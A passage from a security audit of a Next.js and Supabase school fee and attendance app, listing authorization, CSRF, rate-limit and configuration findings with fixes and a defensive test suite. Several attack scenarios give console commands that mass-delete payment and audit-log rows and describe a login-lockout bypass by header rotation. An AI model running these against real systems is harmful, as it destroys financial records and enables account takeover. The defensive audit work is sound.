function escapeHtml(raw: string | number | null | undefined): string {
  return String(raw ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}
```

#### How to Test the Fix
Set a dummy student's name in dev to `<script>alert(1)</script>`, open the Balance Sheet dialog, click **Print / Save PDF**, and verify the literal text `<script>alert(1)</script>` is rendered harmlessly in the table cell without executing.

---

### [AUTH-005] Overly Permissive `FOR ALL` RLS Policies Allow Direct Client Tampering with Audit Logs (`message_log`) and Paid Fees (`fees`)

- **Severity:** **High** — Business logic and audit-trail integrity controls are enforced only in React UI code, not in PostgreSQL RLS or triggers.
- **Category:** Broken Function Level Authorization / Mass Assignment (CWE-285 / CWE-915)
- **Location:** [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L125-L132), [src/components/fees/payment-history-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/payment-history-dialog.tsx#L164-L195)

#### Description
1. **Audit Log Tampering (`message_log`):** The `message_log` table has `create policy "admin full access" on message_log for all to authenticated using (true) with check (true)`. Although the UI only reads `message_log` (all writes happen in server routes `/api/send-*` and `/api/retry-message`), any authenticated client can run `supabase.from('message_log').delete().neq('id', '00000000-0000-0000-0000-000000000000')` from the browser console to wipe the entire WhatsApp compliance audit trail.
2. **Editing `fees.amount_due` After Payments:** In [payment-history-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/payment-history-dialog.tsx#L166-L169), the UI prevents editing `amount_due` once `payments.length > 0 || fee.amount_paid > 0`. However, the database has no trigger or RLS `WITH CHECK` preventing `UPDATE fees SET amount_due = 0` on a fee row that already has payments, nor preventing direct `DELETE FROM fees`.

#### Evidence
```tsx
// src/components/fees/payment-history-dialog.tsx (lines 164-169) — UI-only guard!
async function handleUpdateAmountDue() {
  if (!fee) return
  if (payments.length > 0 || fee.amount_paid > 0) {
    toast.error('Amount due cannot be edited after payments have been recorded.')
    return
  }
```
```sql
-- schema.sql (line 129) — Grants SELECT, INSERT, UPDATE, DELETE on all tables to any authenticated client
execute format('create policy "admin full access" on %I for all to authenticated using (true) with check (true)', t);
```

#### Attack Scenario
A rogue staff member or compromised manager session opens DevTools and runs:
```js
await supabase.from('fee_payments').delete().gt('amount', 0)
await supabase.from('message_log').delete().neq('status', 'invalid')
```
All financial payment records and WhatsApp message logs are permanently erased without any server-side audit log.

#### Impact
Unrestricted deletion or falsification of fee receivables, collected payments, and WhatsApp message logs.

#### Recommended Fix
1. Restrict `message_log` RLS for the `authenticated` role to `SELECT` only (since `/api/send-*` and `/api/retry-message` already run on the server and can use `SUPABASE_SERVICE_ROLE_KEY` to insert/update logs).
2. Restrict `fees` RLS so `DELETE` is disallowed for `authenticated`, and enforce in a `BEFORE UPDATE` trigger (or RLS policy) that `fees.amount_due` cannot be modified if `EXISTS (SELECT 1 FROM fee_payments WHERE fee_id = fees.id)`.

---

### [AUTH-006] Login Rate Limiter is In-Memory Only (Resets on Serverless Cold Start) and Trusts Spoofable `x-forwarded-for`

- **Severity:** **Medium** — In a serverless deployment (Vercel), in-memory `Map` state is not shared across warm instances and resets on redeploy/cold start; additionally, `x-forwarded-for` can be spoofed if not running behind a trusted edge proxy or if multiple IPs are chained.
- **Category:** Improper Restriction of Excessive Authentication Attempts (CWE-307)
- **Location:** [src/app/api/auth/login/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/auth/login/route.ts#L16-L24)

#### Description
`loginAttempts` in `src/app/api/auth/login/route.ts` is stored in a module-scoped JavaScript `Map`. On Vercel serverless functions, concurrent requests may hit different function instances, and cold starts wipe the `Map`. Furthermore, `getClientIp` reads the first entry of `x-forwarded-for` (`forwarded.split(',')[0].trim()`) and keys `rateKey` on `${ip}:${email}`. If an attacker rotates the `X-Forwarded-For` header (in environments that append rather than overwrite `X-Forwarded-For`), every request gets a fresh `ip` key and bypasses the per-account lockout! (Because `rateKey` combines `ip` and `email`, rotating the IP also resets the per-email counter).

#### Evidence
```ts
// src/app/api/auth/login/route.ts (lines 16-28)
const loginAttempts = new Map<string, AttemptRecord>()

function getClientIp(req: NextRequest): string {
  const forwarded = req.headers.get('x-forwarded-for')
  if (forwarded) {
    return forwarded.split(',')[0].trim()
  }
  return req.headers.get('x-real-ip') || 'unknown-ip'
}

function getRateLimitKey(ip: string, email: string): string {
  return `${ip}:${email.toLowerCase()}`
}
```

#### Attack Scenario
An attacker brute-forcing `manager@akshara.com` sends requests with a randomized `X-Forwarded-For: 203.0.113.<rand>` header on each attempt (or distributes requests across IPs). Because the rate-limit key is `${ip}:${email}` instead of tracking `email` independently of `ip`, the attacker gets unlimited password guesses against `manager@akshara.com` (subject only to Supabase Auth's global rate limit).

#### Impact
Bypass of the application's 5-attempt lockout on `/api/auth/login` via IP rotation.

#### Recommended Fix
1. Track failed attempts by **email alone** (`email:${email.toLowerCase()}`) in addition to **IP alone** (`ip:${ip}`), so rotating IPs cannot bypass the per-account lockout.
2. Prefer `req.headers.get('x-vercel-forwarded-for')` on Vercel (which cannot be spoofed by the client).

---

### [AUTH-007] `verifySameOrigin` Allows Requests When `Origin` Header is Omitted and Only Applies to `/api/auth/login`

- **Severity:** **Medium** — Cross-site state-changing `POST` requests (`/api/send-absent-alerts`, `/api/send-fee-reminders`, `/api/send-payment-receipt`, `/api/retry-message`, `/api/auth/logout`) do not verify the `Origin` header.
- **Category:** Cross-Site Request Forgery (CSRF) (CWE-352)
- **Location:** [src/app/api/auth/login/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/auth/login/route.ts#L91-L104), [src/lib/auth.ts](file:///c:/Users/new/akshara%20app/src/lib/auth.ts#L68-L120)

#### Description
1. `verifySameOrigin` in `src/app/api/auth/login/route.ts` returns `true` when `!origin || !host`.
2. None of the other state-changing `POST` API endpoints (`/api/auth/logout`, `/api/send-absent-alerts`, `/api/send-fee-reminders`, `/api/send-payment-receipt`, `/api/retry-message`) call `verifySameOrigin` in `verifyApiAuth()`. While `SameSite=Lax` cookies protect against cross-origin `fetch` with `application/json` preflight in modern browsers, a `POST` request sent without a preflight (e.g., `<form method="POST" enctype="text/plain">` to `/api/auth/logout` or `/api/send-fee-reminders` which ignores JSON parse errors on line 109) will still attach `SameSite=Lax` cookies if triggered via top-level navigation or same-site subdomain.

#### Evidence
```ts
// src/app/api/auth/login/route.ts (lines 91-94)
function verifySameOrigin(req: NextRequest): boolean {
  const origin = req.headers.get('origin')
  const host = req.headers.get('x-forwarded-host') || req.headers.get('host')
  if (!origin || !host) return true
```
```ts
// src/app/api/send-fee-reminders/route.ts (lines 103-110) — Executes even if body is not valid JSON!
try {
  const body = await req.json()
  studentIdFilter = body?.student_id
  dryPreview = !!body?.dry_preview
} catch {
  // Body optional for cron scheduler
}
```

#### Attack Scenario
An attacker crafts a webpage with an auto-submitting HTML `<form action="https://akshara-academy-eta.vercel.app/api/auth/logout" method="POST">`. If `SameSite=Lax` is bypassed via a same-site sibling or top-level POST redirect, `/api/auth/logout` or `/api/send-fee-reminders` executes without checking `Origin` or `Sec-Fetch-Site`.

#### Impact
Forced global logout (`signOut({ scope: 'global' })`) or unintended triggering of scheduled fee reminders.

#### Recommended Fix
Enforce `Origin` / `Sec-Fetch-Site` validation inside `verifyApiAuth` in [src/lib/auth.ts](file:///c:/Users/new/akshara%20app/src/lib/auth.ts) for all non-GET, non-cron cookie-authenticated requests:
```ts
if (req.method !== 'GET' && req.method !== 'HEAD') {
  const secFetchSite = req.headers.get('sec-fetch-site')
  if (secFetchSite && secFetchSite !== 'same-origin' && secFetchSite !== 'none') {
    return {
      authorized: false,
      response: NextResponse.json({ error: 'Cross-origin request blocked.' }, { status: 403 }),
    }
  }
}
```

---

### [AUTH-008] Supabase Edge Functions Lack Manager Email Allowlist Checks, Use Non-Constant-Time `===`, and Expose Wildcard CORS (`*`)

- **Severity:** **Medium** — Inconsistent authorization between Next.js API routes and Supabase Edge Functions.
- **Category:** Inconsistent Authorization Across Channels / Timing Attack (CWE-863 / CWE-208)
- **Location:** [supabase/functions/send-absent-alerts/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-absent-alerts/index.ts#L4-L8), [supabase/functions/send-fee-reminders/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts#L4-L8)

#### Description
In [src/app/(dashboard)/attendance/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/attendance/page.tsx#L387-L405), the client first attempts to invoke the Supabase Edge Function `supabase.functions.invoke('send-absent-alerts')` and falls back to `/api/send-absent-alerts`. While `/api/send-absent-alerts` uses `verifyApiAuth` (which enforces `ADMIN_ALLOWED_EMAILS` and `app_metadata.role`), the Edge Functions only check `if (userError || !user)` and set `'Access-Control-Allow-Origin': '*'`.

#### Evidence
```ts
// supabase/functions/send-absent-alerts/index.ts (lines 4-8, 47-57)
export const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
}
...
const {
  data: { user },
  error: userError,
} = await userClient.auth.getUser()

if (userError || !user) {
  return new Response(JSON.stringify({ error: 'Unauthorized: invalid or expired session' }), {
    status: 401,
```

#### Impact
Any user with a valid JWT who is blocked by `ADMIN_ALLOWED_EMAILS` on Next.js can still invoke the Supabase Edge Functions directly from any origin (`*`).

#### Recommended Fix
Add the same `ADMIN_ALLOWED_EMAILS` and `app_metadata.role` check to both Edge Functions, and restrict `Access-Control-Allow-Origin` to `https://akshara-academy-eta.vercel.app`.

---

### [AUTH-009] Android Manifest Enables `android:allowBackup="true"` and Ships Debug APK in Repo Root

- **Severity:** **Medium** — On physical Android devices with USB debugging enabled, `adb backup` can extract WebView cookies (`sb-*-auth-token`) and local storage if `allowBackup="true"`.
- **Category:** Mobile Client Storage & Backup Exposure (CWE-921)
- **Location:** [android/app/src/main/AndroidManifest.xml](file:///c:/Users/new/akshara%20app/android/app/src/main/AndroidManifest.xml#L5), `akshara-academy-debug.apk` in repo root

#### Description
1. [android/app/src/main/AndroidManifest.xml](file:///c:/Users/new/akshara%20app/android/app/src/main/AndroidManifest.xml#L5) sets `android:allowBackup="true"`. Because the Capacitor Android app loads `https://akshara-academy-eta.vercel.app` in an Android WebView and stores Supabase Auth JWTs in WebView cookies/storage, enabling `allowBackup` allows someone with physical USB access to extract the WebView cookie database via `adb backup`.
2. A compiled debug APK (`akshara-academy-debug.apk`) is present in the project root directory (though `*.apk` is in `.gitignore`).

#### Evidence
```xml
<!-- android/app/src/main/AndroidManifest.xml (lines 4-10) -->
<application
    android:allowBackup="true"
    android:icon="@mipmap/ic_launcher"
    android:label="@string/app_name"
```

#### Recommended Fix
Set `android:allowBackup="false"` in `AndroidManifest.xml`:
```xml
<application
    android:allowBackup="false"
    android:fullBackupContent="false"
```

---

### [AUTH-010] No Rate Limiting on Expensive Image Generation (`/api/receipt-image`) and WhatsApp Sending Endpoints

- **Severity:** **Medium** — Authenticated session or stolen cookie can flood CPU-intensive Satori/Resvg PNG generation or Meta WhatsApp Cloud API calls.
- **Category:** Allocation of Resources Without Limits or Throttling (CWE-770)
- **Location:** [src/app/api/receipt-image/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/receipt-image/route.ts#L5-L29), [src/app/api/retry-message/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/retry-message/route.ts#L55-L60)

#### Description
1. `GET /api/receipt-image` renders an `800x480` PNG image on every request using `next/og` (`ImageResponse`) with `Cache-Control` not set.
2. `POST /api/retry-message` accepts an unbounded array `message_log_ids` ([lines 58-60](file:///c:/Users/new/akshara%20app/src/app/api/retry-message/route.ts#L58-L60)) without a maximum batch cap (e.g., `.slice(0, 100)`).

#### Evidence
```ts
// src/app/api/retry-message/route.ts (lines 55-60)
const targetIds: string[] = []
if (message_log_id && typeof message_log_id === 'string') {
  targetIds.push(message_log_id)
} else if (Array.isArray(message_log_ids) && message_log_ids.length > 0) {
  targetIds.push(...message_log_ids)
}
```

#### Recommended Fix
1. Cap `targetIds` in `/api/retry-message` to at most `100` IDs per request (`message_log_ids.slice(0, 100)`).
2. Add `Cache-Control: private, max-age=3600` to the response headers of `/api/receipt-image` so repeated previews of the same receipt in the Message Log do not re-render the PNG on every click.

---

### [AUTH-011] `attendance.marked_by` and `fee_payments.recorded_by` Are Client-Supplied Instead of Enforced by DB `DEFAULT auth.uid()`

- **Severity:** **Low** — Audit attribution columns (`marked_by`, `recorded_by`) can be spoofed or set to `null` by a client calling PostgREST directly.
- **Category:** Trust of Client Input / Audit Attribution (CWE-807)
- **Location:** [src/app/(dashboard)/attendance/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/attendance/page.tsx#L303-L308), [src/components/fees/record-payment-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/record-payment-dialog.tsx#L88-L97), [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L41)

#### Description
Both `attendance.marked_by` and `fee_payments.recorded_by` reference `auth.users(id)`, but in `schema.sql` neither column has `default auth.uid()` or an RLS `WITH CHECK (marked_by = auth.uid())` constraint. Instead, the client React code fetches `user.id` and passes `marked_by: user?.id || null` in the JSON payload. With 2 manager accounts sharing the portal, one manager could forge or omit `recorded_by` when recording a cash payment via the browser console.

#### Evidence
```sql
-- schema.sql (lines 41 and 64)
marked_by uuid references auth.users(id),
...
recorded_by uuid references auth.users(id),
```

#### Recommended Fix
Set `default auth.uid()` on both columns and enforce `recorded_by = auth.uid()` in the `INSERT` RLS policy:
```sql
alter table attendance alter column marked_by set default auth.uid();
alter table fee_payments alter column recorded_by set default auth.uid();
```

---

### [AUTH-012] Missing `Strict-Transport-Security` (HSTS) and `Content-Security-Policy` (CSP) Headers in Proxy

- **Severity:** **Low** — Defense-in-depth headers against protocol downgrade and inline script execution are not set in `applySecurityHeaders`.
- **Category:** Security Misconfiguration (CWE-693)
- **Location:** [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L5-L11)

#### Evidence
```ts
// src/proxy.ts (lines 5-11)
function applySecurityHeaders(res: NextResponse): NextResponse {
  res.headers.set('X-Frame-Options', 'DENY')
  res.headers.set('X-Content-Type-Options', 'nosniff')
  res.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin')
  res.headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()')
  return res
}
```

#### Recommended Fix
Add `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` to `applySecurityHeaders` in `src/proxy.ts`.

---

### [AUTH-013] Raw Database / Internal Error Messages Returned to Client in API `catch` Blocks (`500` Responses)

- **Severity:** **Low** — Leaks internal table/constraint names if a Supabase query throws an unexpected error.
- **Category:** Information Exposure Through an Error Message (CWE-209)
- **Location:** [src/app/api/export-fees/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts#L552-L555), [src/app/api/send-fee-reminders/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/send-fee-reminders/route.ts#L474-L478), [src/app/api/send-absent-alerts/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/send-absent-alerts/route.ts#L261-L265)

#### Evidence
```ts
// src/app/api/export-fees/route.ts (lines 552-555)
} catch (err: unknown) {
  console.error('export-fees API error:', err)
  const msg = err instanceof Error ? err.message : 'Failed to generate fee balance sheet'
  return NextResponse.json({ error: msg }, { status: 500 })
}
```

#### Recommended Fix
Log the detailed `err` on the server (`console.error`), and return a generic user-facing message (`{ error: 'An internal server error occurred.' }`) in `500` responses.

---

### [AUTH-014] `@supabase/ssr` Session Cookies Are Not `HttpOnly` Due to Direct Browser-to-Supabase Architecture

- **Severity:** **Info / Architectural** — By design in `@supabase/ssr`, cookies set by `createServerClient` do not set `httpOnly: true` because `createBrowserClient` in Client Components reads `document.cookie` to attach the `Authorization: Bearer <jwt>` header to direct PostgREST calls.
- **Category:** Sensitive Cookie Without `HttpOnly` Flag (CWE-1004)
- **Location:** [src/lib/supabase/server.ts](file:///c:/Users/new/akshara%20app/src/lib/supabase/server.ts#L13-L28), [src/lib/supabase/client.ts](file:///c:/Users/new/akshara%20app/src/lib/supabase/client.ts#L3-L12)

#### Description & Mitigation Note
Because `createBrowserClient` requires access to the cookie in JavaScript, any XSS vulnerability (such as `AUTH-004`) can read the session token from `document.cookie`. Fixing `AUTH-004` and adding a strict Content-Security-Policy (`AUTH-012`) are critical to mitigating this architectural trade-off.

---

## 5. Automated Negative Security Tests (Phase 6 — Reference Only, Do Not Merge)

Below is a non-destructive Vitest/Node test suite you can run against a local dev instance (`http://localhost:3000`) to verify authentication, authorization, rate limiting, and input sanitization:

```ts
// tests/security/auth-negative.test.ts (Reference negative test suite)
import { describe, it, expect } from 'vitest'

const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3000'

describe('Akshara Academy — AuthN & AuthZ Negative Security Suite', () => {
  it('1. Rejects unauthenticated requests to all protected API routes with 401 JSON (not 307 redirect)', async () => {
    const endpoints = [
      { method: 'GET', path: '/api/export-fees?format=json' },
      { method: 'GET', path: '/api/receipt-image?student=Test&amount=1000' },
      { method: 'POST', path: '/api/send-absent-alerts' },
      { method: 'POST', path: '/api/send-fee-reminders' },
      { method: 'POST', path: '/api/send-payment-receipt' },
      { method: 'POST', path: '/api/retry-message' },
    ]

    for (const ep of endpoints) {
      const res = await fetch(`${BASE_URL}${ep.path}`, {
        method: ep.method,
        redirect: 'manual',
      })
      expect(res.status).toBe(401)
      const body = await res.json()
      expect(body.error).toMatch(/unauthorized/i)
    }
  })

  it('2. Rejects forged Bearer token on /api/send-fee-reminders', async () => {
    const res = await fetch(`${BASE_URL}/api/send-fee-reminders`, {
      method: 'POST',
      headers: {
        Authorization: 'Bearer forged-cron-secret-token',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ dry_preview: true }),
    })
    expect(res.status).toBe(401)
  })

  it('3. Blocks cross-origin POST to /api/auth/login (CSRF protection)', async () => {
    const res = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: {
        Origin: 'https://evil-attacker.example.com',
        Host: 'localhost:3000',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: 'manager@akshara.com',
        password: 'WrongPassword123!',
      }),
    })
    expect(res.status).toBe(403)
  })

  it('4. Enforces brute-force lockout after 5 failed login attempts', async () => {
    const testEmail = `ratelimit-${Date.now()}@akshara.com`
    let lastStatus = 0

    for (let i = 1; i <= 6; i++) {
      const res = await fetch(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: testEmail,
          password: 'WrongPassword123!',
        }),
      })
      lastStatus = res.status
    }

    expect(lastStatus).toBe(429)
  })
})
```

---

## 6. Things Done Well

1. **Server-Side Token Verification (`getUser()` vs `getSession()`):** Every server route and [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts#L52-L54) calls `supabase.auth.getUser()`, which re-validates the JWT against the Supabase Auth server rather than trusting unverified cookie payloads.
2. **Constant-Time Secret Comparison in Next.js:** [src/lib/auth.ts](file:///c:/Users/new/akshara%20app/src/lib/auth.ts#L10-L16) uses `crypto.timingSafeEqual` when comparing `CRON_SECRET` and `SUPABASE_SERVICE_ROLE_KEY`.
3. **Centralized API Guard (`verifyApiAuth`):** All 6 protected Next.js API routes (`/api/export-fees`, `/api/receipt-image`, `/api/send-absent-alerts`, `/api/send-fee-reminders`, `/api/send-payment-receipt`, `/api/retry-message`) consistently call `verifyApiAuth(req)`.
4. **Database Deduplication of WhatsApp Messages:** The partial unique index `message_log_dedupe` on `(student_id, kind, related_date) where status <> 'failed'` in [migration_student_registry.sql](file:///c:/Users/new/akshara%20app/migration_student_registry.sql#L10-L12) prevents race-condition double-sending of absent alerts or daily fee reminders at the database level.
5. **Security Invoker View (`fee_summary`):** [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L89) defines `create or replace view fee_summary with (security_invoker = true)` and revokes `anon`/`public` access on `fee_summary` and `generate_monthly_fees`.
6. **Secrets Excluded from Git:** `.gitignore` properly excludes `.env` and `.env*.local`, and `cron_fee_reminders.sql` uses `vault.decrypted_secrets` rather than hardcoding keys in SQL.

---

## 7. Could Not Verify (Requires Runtime / Supabase Dashboard Inspection)

The following items reside outside the repository in the live Supabase / Vercel / Meta dashboards and could not be verified from source code alone:
1. **Supabase Auth "Enable Sign Ups" Toggle (`Suspected`):** [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L2-L3) states *"disable public sign-ups in Auth settings"*. If **Allow new users to sign up** is still enabled in the Supabase Dashboard (`Authentication -> Providers -> Email`), anyone can register a valid `authenticated` user using the public `NEXT_PUBLIC_SUPABASE_ANON_KEY` and exploit `AUTH-002`.
2. **Deployed Database Schema Sync (`Suspected`):** Whether the latest `security_invoker = true` and `REVOKE ALL ON fee_summary FROM anon, public` statements in [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L89-L124) have been executed in the live Supabase SQL Editor (`ref: bjrgqevccafjhqvnxamn`).
3. **Vercel Environment Variables (`Suspected`):** Whether `ADMIN_ALLOWED_EMAILS` and `CRON_SECRET` are populated in the production Vercel project (`https://akshara-academy-eta.vercel.app`). If `ADMIN_ALLOWED_EMAILS` is left blank, `isAuthorizedManager` allows any non-blocked Supabase user.
4. **Supabase Password Policy & Leaked Password Protection (`Suspected`):** Minimum password length (Supabase defaults to 6 characters unless raised to 8–12 in Dashboard) and HaveIBeenPwned breached-password checking are configured in the Supabase Auth dashboard.
5. **Meta WhatsApp Token Scope & Rotation (`Suspected`):** Whether `WHATSAPP_TOKEN` in `.env.local` / Vercel is a permanent System User token scoped strictly to `whatsapp_business_messaging` for the single `WHATSAPP_PHONE_NUMBER_ID`.

---

## 8. Prioritized Remediation Roadmap

### Phase A: Quick Wins (Under 1 Day)
1. **Fix `AUTH-001` (Critical):** Remove the `|| supabaseAnonKey` fallback for `SUPABASE_SERVICE_ROLE_KEY` in [supabase/functions/send-fee-reminders/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts#L72) and [supabase/functions/send-absent-alerts/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-absent-alerts/index.ts#L41).
2. **Fix `AUTH-003` & `AUTH-004` (High):** Sanitize leading formula characters (`=`, `+`, `-`, `@`) in `escapeCsvCell` ([src/app/api/export-fees/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts#L43)) and HTML-escape all dynamic fields in `handlePrintBalanceSheet` ([src/components/fees/export-balance-sheet-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/export-balance-sheet-dialog.tsx#L185)).
3. **Fix `AUTH-006` (Medium):** Key the login rate limiter in [src/app/api/auth/login/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/auth/login/route.ts#L26) by `email` independently of `ip` so IP header spoofing/rotation cannot bypass the 5-attempt account lockout.
4. **Verify Supabase Dashboard Settings:** Confirm **Allow new users to sign up** is turned **OFF** in Supabase Dashboard -> Authentication -> User Signups, and set `ADMIN_ALLOWED_EMAILS` in Vercel + `.env.local`.

### Phase B: Medium Effort (1–2 Days)
1. **Fix `AUTH-002` & `AUTH-005` (High — Database RLS Hardening):** Replace the blanket `for all to authenticated using (true)` loop in [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql#L125-L132) with granular per-table RLS policies backed by a `public.is_authorized_manager()` SQL function, restrict `message_log` client access to `SELECT` only, and add a `BEFORE UPDATE` trigger on `fees` to block changing `amount_due` after payments exist.
2. **Fix `AUTH-007` & `AUTH-010` (Medium):** Add `Sec-Fetch-Site` / `Origin` verification to `verifyApiAuth` for all `POST` requests, cap `message_log_ids` at 100 in `/api/retry-message`, and add `Cache-Control: private, max-age=3600` to `/api/receipt-image`.
3. **Fix `AUTH-009` & `AUTH-011` (Medium/Low):** Set `android:allowBackup="false"` in [AndroidManifest.xml](file:///c:/Users/new/akshara%20app/android/app/src/main/AndroidManifest.xml#L5) and set `DEFAULT auth.uid()` on `attendance.marked_by` and `fee_payments.recorded_by`.

### Phase C: Structural Improvements (Longer Term)
1. **Server-Only Data Access Layer (DAL):** Move remaining direct client-side Supabase mutations (`students`, `attendance`, `fees`, `fee_payments`) behind Next.js Server Actions or `/api/*` Route Handlers so `@supabase/ssr` cookies can be made strictly `HttpOnly` (`AUTH-014`).

---

## 9. Scope Coverage: Files Reviewed vs. Skipped

### Reviewed Files (100% of Auth, API, DB, Pages, Components & Mobile Config)
- **Auth & Middleware:** [src/proxy.ts](file:///c:/Users/new/akshara%20app/src/proxy.ts), [src/lib/auth.ts](file:///c:/Users/new/akshara%20app/src/lib/auth.ts), [src/lib/supabase/server.ts](file:///c:/Users/new/akshara%20app/src/lib/supabase/server.ts), [src/lib/supabase/client.ts](file:///c:/Users/new/akshara%20app/src/lib/supabase/client.ts), [src/app/login/page.tsx](file:///c:/Users/new/akshara%20app/src/app/login/page.tsx), [src/components/account-menu.tsx](file:///c:/Users/new/akshara%20app/src/components/account-menu.tsx), [src/components/logout-button.tsx](file:///c:/Users/new/akshara%20app/src/components/logout-button.tsx), [src/components/dashboard-nav.tsx](file:///c:/Users/new/akshara%20app/src/components/dashboard-nav.tsx)
- **Next.js API Routes:** [src/app/api/auth/login/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/auth/login/route.ts), [src/app/api/auth/logout/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/auth/logout/route.ts), [src/app/api/export-fees/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/export-fees/route.ts), [src/app/api/receipt-image/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/receipt-image/route.ts), [src/app/api/send-absent-alerts/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/send-absent-alerts/route.ts), [src/app/api/send-fee-reminders/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/send-fee-reminders/route.ts), [src/app/api/send-payment-receipt/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/send-payment-receipt/route.ts), [src/app/api/retry-message/route.ts](file:///c:/Users/new/akshara%20app/src/app/api/retry-message/route.ts)
- **Supabase SQL & Edge Functions:** [schema.sql](file:///c:/Users/new/akshara%20app/schema.sql), [migration_student_registry.sql](file:///c:/Users/new/akshara%20app/migration_student_registry.sql), [cron_fee_reminders.sql](file:///c:/Users/new/akshara%20app/cron_fee_reminders.sql), [seed_students.sql](file:///c:/Users/new/akshara%20app/seed_students.sql), [seed_fees.sql](file:///c:/Users/new/akshara%20app/seed_fees.sql), [seed_attendance.sql](file:///c:/Users/new/akshara%20app/seed_attendance.sql), [supabase/functions/send-absent-alerts/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-absent-alerts/index.ts), [supabase/functions/send-fee-reminders/index.ts](file:///c:/Users/new/akshara%20app/supabase/functions/send-fee-reminders/index.ts), [supabase/.temp/linked-project.json](file:///c:/Users/new/akshara%20app/supabase/.temp/linked-project.json)
- **Dashboard Pages & Dialogs:** [src/app/layout.tsx](file:///c:/Users/new/akshara%20app/src/app/layout.tsx), [src/app/(dashboard)/layout.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/layout.tsx), [src/app/(dashboard)/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/page.tsx), [src/app/(dashboard)/students/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/students/page.tsx), [src/app/(dashboard)/attendance/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/attendance/page.tsx), [src/app/(dashboard)/fees/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/fees/page.tsx), [src/app/(dashboard)/messages/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/messages/page.tsx), [src/app/(dashboard)/message-log/page.tsx](file:///c:/Users/new/akshara%20app/src/app/(dashboard)/message-log/page.tsx), [src/components/fees/record-payment-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/record-payment-dialog.tsx), [src/components/fees/payment-history-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/payment-history-dialog.tsx), [src/components/fees/send-fee-reminders-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/send-fee-reminders-dialog.tsx), [src/components/fees/export-balance-sheet-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/fees/export-balance-sheet-dialog.tsx), [src/components/students/student-form-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/students/student-form-dialog.tsx), [src/components/students/student-details-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/students/student-details-dialog.tsx), [src/components/students/status-confirm-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/students/status-confirm-dialog.tsx), [src/components/attendance/send-confirm-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/attendance/send-confirm-dialog.tsx), [src/components/attendance/send-result-dialog.tsx](file:///c:/Users/new/akshara%20app/src/components/attendance/send-result-dialog.tsx)
